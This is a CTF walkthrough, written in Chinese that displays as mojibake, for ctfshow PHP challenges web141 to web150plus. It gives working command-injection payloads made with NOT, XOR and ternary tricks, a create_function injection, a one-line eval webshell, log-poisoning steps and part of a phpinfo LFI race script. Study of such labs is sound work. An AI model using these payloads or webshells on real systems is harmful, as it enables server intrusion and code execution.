)ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œå¤±è´¥åˆ™è¿”å› FALSE ã€‚system()å¿…é¡»åŒ…å«å‚æ•°ï¼Œå¤±è´¥è¿”å›FLASEï¼›system(\u0026lsquo;FLASE\u0026rsquo;)ï¼Œç©ºæŒ‡ä»¤ï¼Œå¤±è´¥è¿”å›FLASEã€‚\npayload2ï¼š usleep(usleep())\u0026mdash;\u0026gt; f1=usleep\u0026amp;f2=usleep usleepæ²¡æœ‰è¿”å›å€¼ã€‚ æ‰€ä»¥intvalå‚æ•°ä¸ºç©ºï¼Œå¤±è´¥è¿”å›0\npayload3ï¼š getdate(getdate())\u0026mdash;\u0026gt; f1=getdate\u0026amp;f2=getdate\narray getdate([ int $timestamp = time()] )ï¼šè¿”å›ç»“æœæ˜¯arrayï¼Œå‚æ•°å¿…é¡»æ˜¯intå‹ã€‚æ‰€ä»¥getdate(getdate())\u0026mdash;-\u0026gt;getdate(arrayå‹)\u0026mdash;\u0026gt;å¤±è´¥è¿”å›flaseï¼Œintvalä¸º0ã€‚\nweb141 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:28:09 9 10*/ 11 12#error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 19 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 20 if(preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v3)){ 21 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 22 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 23 } 24 } 25} preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v3) æ­¤æ­£åˆ™è¡¨è¾¾å¼ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸² $v3 æ˜¯å¦å®Œå…¨ç”±éå•è¯å­—ç¬¦ç»„æˆï¼Œä¸”ä¸èƒ½ä¸ºç©ºã€‚ï¼ˆå•è¯å­—ç¬¦ï¼šå­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼‰\næ ¹æ®é¢˜ç›®æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°å–åï¼Œæˆ–ï¼Œå¼‚æˆ–å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œéšä¾¿ä¸€ä¸ªéƒ½è¡Œ\nphpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ 1-phpinfo();æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚è¿™æ ·å°±å¥½è¯´äº†ã€‚æ„é€ å‡º1-phpinfo()-1å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ v1=1\u0026amp;v2=1\u0026amp;v3=-phpinfo()-\nç¾½å¸ˆå‚…æœ‰ä¸ªå–åè„šæœ¬\n1\u0026lt;?php 2//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ 3 4/*author yu22x*/ 5 6fwrite(STDOUT,\u0026#39;[+]your function: \u0026#39;); 7 8$system=str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); 9 10fwrite(STDOUT,\u0026#39;[+]your command: \u0026#39;); 11 12$command=str_replace(array(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\r\u0026#34;, \u0026#34;\\n\u0026#34;), \u0026#34;\u0026#34;, fgets(STDIN)); 13 14echo \u0026#39;[*] (~\u0026#39;.urlencode(~$system).\u0026#39;)(~\u0026#39;.urlencode(~$command).\u0026#39;);\u0026#39;; ç›´æ¥ç”¨å°±è¡Œ\npayload:\n?v1=1\u0026amp;v2=1\u0026amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)- web142 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-17 19:36:02 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 if(is_numeric($v1)){ 17 $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); 18 sleep($d); 19 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 20 } 21} è¿™é¢˜å°±æ˜¯ä¸€ä¸ª$dç§’åå‡ºflagï¼Œç›´æ¥ä¼ å…¥v1=0ï¼Œç›´æ¥æ‹¿åˆ°flag\npayload:\n?v1=0 web143 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 12:48:14 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 14 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 15 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 16 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 17 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 18 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026amp;|\\;/i\u0026#39;, $v3)){ 19 die(\u0026#39;get out hacker!\u0026#39;); 20 } 21 else{ 22 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 23 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 24 } 25 } 26} è¿™é¢˜banæ‰äº†å–åï¼Œåªèƒ½ç”¨å…¶ä»–ä½è¿ç®—ç¬¦æ„é€ payload\nç¾½å¸ˆå‚…çš„å¼‚æˆ–è„šæœ¬\n1\u0026lt;?php 2 3/*author yu22x*/ 4 5$myfile = fopen(\u0026#34;xor_rce.txt\u0026#34;, \u0026#34;w\u0026#34;); 6$contents=\u0026#34;\u0026#34;; 7for ($i=0; $i \u0026lt; 256; $i++) { 8\tfor ($j=0; $j \u0026lt;256 ; $j++) { 9 10\tif($i\u0026lt;16){ 11\t$hex_i=\u0026#39;0\u0026#39;.dechex($i); 12\t} 13\telse{ 14\t$hex_i=dechex($i); 15\t} 16\tif($j\u0026lt;16){ 17\t$hex_j=\u0026#39;0\u0026#39;.dechex($j); 18\t} 19\telse{ 20\t$hex_j=dechex($j); 21\t} 22\t$preg = \u0026#39;/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\\u0026amp;|\\;/i\u0026#39;; //æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯ 23\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 24\techo \u0026#34;\u0026#34;; 25 } 26 27\telse{ 28\t$a=\u0026#39;%\u0026#39;.$hex_i; 29\t$b=\u0026#39;%\u0026#39;.$hex_j; 30\t$c=(urldecode($a)^urldecode($b)); 31\tif (ord($c)\u0026gt;=32\u0026amp;ord($c)\u0026lt;=126) { 32\t$contents=$contents.$c.\u0026#34; \u0026#34;.$a.\u0026#34; \u0026#34;.$b.\u0026#34;\\n\u0026#34;; 33\t} 34\t} 35 36} 37} 38fwrite($myfile,$contents); 39fclose($myfile); 1# -*- coding: utf-8 -*- 2 3# author yu22x 4 5import requests 6import urllib 7from sys import * 8import os 9def action(arg): 10 s1=\u0026#34;\u0026#34; 11 s2=\u0026#34;\u0026#34; 12 for i in arg: 13 f=open(\u0026#34;xor_rce.txt\u0026#34;,\u0026#34;r\u0026#34;) 14 while True: 15 t=f.readline() 16 if t==\u0026#34;\u0026#34;: 17 break 18 if t[0]==i: 19 #print(i) 20 s1+=t[2:5] 21 s2+=t[6:9] 22 break 23 f.close() 24 output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;^\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; 25 return(output) 26 27while True: 28 param=action(input(\u0026#34;\\n[+] your functionï¼š\u0026#34;) )+action(input(\u0026#34;[+] your commandï¼š\u0026#34;))+\u0026#34;;\u0026#34; 29 print(param) web144 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 16:21:15 9 10*/ 11 12highlight_file(__FILE__); 13if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 14 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 15 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 16 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 17 18 if(is_numeric($v1) \u0026amp;\u0026amp; check($v3)){ 19 if(preg_match(\u0026#39;/^\\W+$/\u0026#39;, $v2)){ 20 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 21 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 22 } 23 } 24} 25 26function check($str){ 27 return strlen($str)===1?true:false; 28} è¿™é¢˜è·Ÿ143å·®ä¸å¤šï¼Œåªæ˜¯å‚æ•°äº¤æ¢äº†ä¸€ä¸‹ä½ç½®\nç›´æ¥å¼‚æˆ–å‡ºäº†\n?v1=1\u0026amp;v2=-(\u0026#34;%0c%06%0c%0b%05%0d\u0026#34;^\u0026#34;%7f%7f%7f%7f%60%60\u0026#34;)(\u0026#34;%03%01%0b%00%06%00\u0026#34;^\u0026#34;%60%60%7f%20%60%2a\u0026#34;)\u0026amp;v3=1 web145 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 19 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026amp;|\\;|\\\u0026lt;|\\\u0026gt;|\\*|\\/|\\^|\\#|\\\u0026#34;/i\u0026#39;, $v3)){ 20 die(\u0026#39;get out hacker!\u0026#39;); 21 } 22 else{ 23 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 24 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 25 } 26 } 27} è¿™é¢˜banæ‰äº†å¼‚æˆ–è¿ç®—ç¬¦^,åŒæ—¶ä¹Ÿbanæ‰äº†åŠ å‡ä¹˜é™¤\nä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥è€ƒè™‘æ„é€ ä¸‰ç›®è¿ç®—ç¬¦é…åˆå–å\npayload:\n/?v1=1\u0026amp;v2=1\u0026amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5): web146 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-18 17:41:33 9 10*/ 11 12 13highlight_file(__FILE__); 14if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v3\u0026#39;])){ 15 $v1 = (String)$_GET[\u0026#39;v1\u0026#39;]; 16 $v2 = (String)$_GET[\u0026#39;v2\u0026#39;]; 17 $v3 = (String)$_GET[\u0026#39;v3\u0026#39;]; 18 if(is_numeric($v1) \u0026amp;\u0026amp; is_numeric($v2)){ 19 if(preg_match(\u0026#39;/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\\u0026amp;|\\;|\\\u0026lt;|\\\u0026gt;|\\*|\\/|\\^|\\#|\\\u0026#34;/i\u0026#39;, $v3)){ 20 die(\u0026#39;get out hacker!\u0026#39;); 21 } 22 else{ 23 $code = eval(\u0026#34;return $v1$v3$v2;\u0026#34;); 24 echo \u0026#34;$v1$v3$v2 = \u0026#34;.$code; 25 } 26 } 27} è¿™é¢˜æŠŠä¸‰ç›®è¿ç®—ç¬¦ä¹Ÿbanäº†\nå¯ä»¥è€ƒè™‘ä½¿ç”¨ä½è¿ç®—ç¬¦|\npayload:\n?v1=1\u0026amp;v2=1\u0026amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)| web147 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 02:04:38 9 10*/ 11 12 13 14highlight_file(__FILE__); 15 16if(isset($_POST[\u0026#39;ctf\u0026#39;])){ 17 $ctfshow = $_POST[\u0026#39;ctf\u0026#39;]; 18 if(!preg_match(\u0026#39;/^[a-z0-9_]*$/isD\u0026#39;,$ctfshow)) { 19 $ctfshow(\u0026#39;\u0026#39;,$_GET[\u0026#39;show\u0026#39;]); 20 } 21 22} create_function()ä»£ç æ³¨å…¥\nå¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ echo 1;}phpinfo();// å°±ç­‰ä»·äº\nfunction f($a) {\recho 1;}phpinfo();//\r}\rä»è€Œæ‰§è¡Œphpinfo()å‘½ä»¤ é‚£è¦æ€ä¹ˆç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼å‘¢\n/^[a-z0-9_]*$/isD è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ‰€æœ‰çš„å­—æ¯æ•°å­—å’Œä¸‹åˆ’çº¿\nè€Œä¸”ç”±äº\nphpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼› è€Œå¦‚æœå†™\\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡\\create_function()æ¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼\npayload:\nGET show=;};system(\u0026#39;cat f*\u0026#39;);/*\rPOST ctf=\\create_function web148 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 03:52:11 9 10*/ 11 12 13 14include \u0026#39;flag.php\u0026#39;; 15if(isset($_GET[\u0026#39;code\u0026#39;])){ 16 $code=$_GET[\u0026#39;code\u0026#39;]; 17 if(preg_match(\u0026#34;/[A-Za-z0-9_\\%\\\\|\\~\\\u0026#39;\\,\\.\\:\\@\\\u0026amp;\\*\\+\\- ]+/\u0026#34;,$code)){ 18 die(\u0026#34;error\u0026#34;); 19 } 20 @eval($code); 21} 22else{ 23 highlight_file(__FILE__); 24} 25 26function get_ctfshow_fl0g(){ 27 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 28} æ²¡banå¼‚æˆ–è¿ç®—ç¬¦\npayload:\n(\u0026#34;%08%02%08%09%05%0d\u0026#34;^\u0026#34;%7b%7b%7b%7d%60%60\u0026#34;)(\u0026#34;%03%01%09%01%06%02\u0026#34;^\u0026#34;%60%60%7d%21%60%28\u0026#34;);\r//system(\u0026#34;cat f*\u0026#34;); web149 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 04:34:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15 16$files = scandir(\u0026#39;./\u0026#39;); 17foreach($files as $file) { 18 if(is_file($file)){ 19 if ($file !== \u0026#34;index.php\u0026#34;) { 20 unlink($file); 21 } 22 } 23} 24 25file_put_contents($_GET[\u0026#39;ctf\u0026#39;], $_POST[\u0026#39;show\u0026#39;]); 26 27$files = scandir(\u0026#39;./\u0026#39;); 28foreach($files as $file) { 29 if(is_file($file)){ 30 if ($file !== \u0026#34;index.php\u0026#34;) { 31 unlink($file); 32 } 33 } 34} ç›´æ¥ç”¨ä¸€å¥è¯æœ¨é©¬è¦†å†™æ‰index.php\nGET ?ctf=index.php\rPOST show=\u0026lt;?php @eval($_POST[\u0026#39;1\u0026#39;]);?\u0026gt; å†™å…¥å\nPOST 1=system(\u0026#39;cat /ctfshow_fl0g_here.txt\u0026#39;); web150 éé¢„æœŸ æ—¥å¿—æ³¨å…¥\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\u0026#34;flag.php\u0026#34;); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u0026gt;vip = 0; 23 $this-\u0026gt;secret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u0026gt;secret; 28 } 29 30 public function isVIP(){ 31 return $this-\u0026gt;vip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#è¿‡æ»¤å­—ç¬¦ 42$key = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 43if(preg_match(\u0026#39;/\\_| |\\[|\\]|\\?/\u0026#39;, $key)){ 44 die(\u0026#34;error\u0026#34;); 45} 46$ctf = $_POST[\u0026#39;ctf\u0026#39;]; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \u0026#34;class is exists!\u0026#34;; 50} 51 52if($isVIP \u0026amp;\u0026amp; strrpos($ctf, \u0026#34;:\u0026#34;)===FALSE){ 53 include($ctf); 54} è¿™é¢˜å­˜åœ¨éé¢„æœŸï¼Œå¯ä»¥é€šè¿‡extractå˜é‡è¦†ç›–ä½¿isVIP=trueï¼Œæ¥ç€è¿›è¡Œæ—¥å¿—æ³¨å…¥\næˆ–è€…\næŠŠé©¬å†™åˆ°æ—¥å¿—é‡Œ\npayload:\nGET ?isVIP=true\u0026amp;1=system(\u0026#39;cat f*\u0026#39;);\rPOST ctf=/var/log/nginx/access.log web150plus 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\u0026#34;flag.php\u0026#34;); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u0026gt;vip = 0; 23 $this-\u0026gt;secret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u0026gt;secret; 28 } 29 30 public function isVIP(){ 31 return $this-\u0026gt;vip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#è¿‡æ»¤å­—ç¬¦ 42$key = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 43if(preg_match(\u0026#39;/\\_| |\\[|\\]|\\?/\u0026#39;, $key)){ 44 die(\u0026#34;error\u0026#34;); 45} 46$ctf = $_POST[\u0026#39;ctf\u0026#39;]; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \u0026#34;class is exists!\u0026#34;; 50} 51 52if($isVIP \u0026amp;\u0026amp; strrpos($ctf, \u0026#34;:\u0026#34;)===FALSE \u0026amp;\u0026amp; strrpos($ctf,\u0026#34;log\u0026#34;)===FALSE){ 53 include($ctf); 54} è¿™é¢˜banæ‰äº†éé¢„æœŸè§£ æ—¥å¿—æ³¨å…¥çš„æ–¹æ³•\né¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“__autoloadæ–¹æ³•çš„ä½œç”¨\n__autoload()ï¼šè‡ªåŠ¨åŠ è½½å‡½æ•°ï¼Œå½“ä½¿ç”¨æœªå®šä¹‰çš„ç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å‡½æ•°ã€‚å¦‚æœ$classå˜é‡å·²è®¾ç½®ï¼Œåˆ™å°†å…¶ä½œä¸ºå‡½æ•°è°ƒç”¨ã€‚ è€Œä¸”è¿™é¢˜çš„__autoloadå¹¶ä¸åœ¨ç±»CTFSHOWä¸­ï¼ˆéšœçœ¼æ³•ï¼‰\nè¿™ä¸ªç±»åœ¨isVIPåé¢å·²ç»ç»“æŸäº†\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡\nif(class_exists($__CTFSHOW__)){\recho \u0026#34;class is exists!\u0026#34;;\r} è°ƒç”¨ä»»æ„çš„ç±»\næˆ‘ä»¬å¯ä»¥æ ¹æ®phpä¼šå°†.è§£ææˆ_çš„ç‰¹æ€§ç»•è¿‡æ­£åˆ™\nGET ?..CTFSHOW..=phpinfo ç”±äºåŸé¢˜éœ€è¦ç«äº‰æ‰€ä»¥åé¢å°±ç›´æ¥æŠŠflagæ”¾ç¯å¢ƒå˜é‡äº†\nè¿™é‡Œæˆ‘ä»¬ç›´æ¥åœ¨phpinfoé‡Œé¢æ‰¾å°±è¡Œ\nåŸé¢˜è§£æ³• æ‹¿åˆ°phpinfoæˆ‘ä»¬å°±å¯ä»¥getshelläº†\nPHP LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸»è¦æ˜¯åŒ…å«æœ¬åœ°æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„ä¸€äº›æ–‡ä»¶ï¼Œä¾‹å¦‚sessionæ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ç­‰ã€‚ä½†æ˜¯ï¼Œåªæœ‰æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶åŒ…å«çš„æ–‡ä»¶å­˜å‚¨æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰èƒ½æ‹¿åˆ°æœåŠ¡å™¨æƒé™ã€‚å‡å¦‚åœ¨æœåŠ¡å™¨ä¸Šæ‰¾ä¸åˆ°æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡åˆ©ç”¨ä¸€äº›æŠ€å·§è®©æœåŠ¡å­˜å‚¨æˆ‘ä»¬æ¶æ„ç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶ï¼Œè¯¥ä¸´æ—¶æ–‡ä»¶åŒ…å«æˆ‘ä»¬æ„é€ çš„çš„æ¶æ„ä»£ç ï¼Œæ­¤æ—¶æœåŠ¡å™¨å°±å­˜åœ¨æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶äº†ã€‚å¦‚æœç›®æ ‡ç½‘ç«™ä¸Šå­˜åœ¨phpinfoï¼Œåˆ™å¯ä»¥é€šè¿‡phpinfoæ¥è·å–ä¸´æ—¶æ–‡ä»¶åï¼Œè¿›è€Œè¿›è¡ŒåŒ…å«ã€‚ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_63701832/article/details/129337902\nè¿‡ç¨‹ 1.å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerã€getç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ®\n2.phpinfoé¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ªphpinfoé¡µé¢æ’‘å¾—éå¸¸å¤§\n3.phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥\n4.æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…\n5.æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸ºphpè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ é™¤\n6.åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œå‘ç¬¬äºŒä¸ªæ•°æ®åŒ…ï¼Œå³å¯æˆåŠŸåŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼Œæœ€ç»ˆgetshell\nå¤„ç† PHP å¯¹ enctype=\u0026ldquo;multipart/form-data\u0026quot;è¯·æ±‚çš„å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š 1ã€è¯·æ±‚åˆ°è¾¾ï¼› 2ã€åˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/php[6 ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œå¹¶å†™å…¥ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ï¼› 3ã€è°ƒç”¨ç›¸åº” PHP è„šæœ¬è¿›è¡Œå¤„ç†ï¼Œå¦‚æ ¡éªŒåç§°ã€å¤§å°ç­‰ï¼› 4ã€åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚ æ€»ç»“ php post ä¸Šä¼ æ–‡ä»¶äº§ç”Ÿä¸´æ—¶æ–‡ä»¶ï¼Œphpinfoè¯»ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„å’Œåå­—ï¼Œæœ¬åœ°åŒ…å«åç”Ÿæˆåé—¨ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_63701832/article/details/129337902\nå¤§ä½¬çš„è„šæœ¬ï¼Œä½†æ˜¯æ˜¯python2çš„\n1#!/usr/bin/python 2import sys 3import threading 4import socket 5 6def setup(host, port): 7 TAG=\u0026#34;Security Test\u0026#34; 8 PAYLOAD=\u0026#34;\u0026#34;\u0026#34;%s\\r 9\u0026lt;?php file_put_contents(\u0026#39;/tmp/g\u0026#39;, \u0026#39;\u0026lt;?=eval($_REQUEST[1])?\u0026gt;\u0026#39;)?\u0026gt;\\r\u0026#34;\u0026#34;\u0026#34; % TAG 10 REQ1_DATA=\u0026#34;\u0026#34;\u0026#34;-----------------------------7dbff1ded0714\\r 11Content-Disposition: form-data; name=\u0026#34;dummyname\u0026#34;; filename=\u0026#34;test.txt\u0026#34;\\r 12Content-Type: text/plain\\r 13\\r 14%s 15-----------------------------7dbff1ded0714--\\r\u0026#34;\u0026#34;\u0026#34; % PAYLOAD 16 padding=\u0026#34;A\u0026#34; * 5000 17 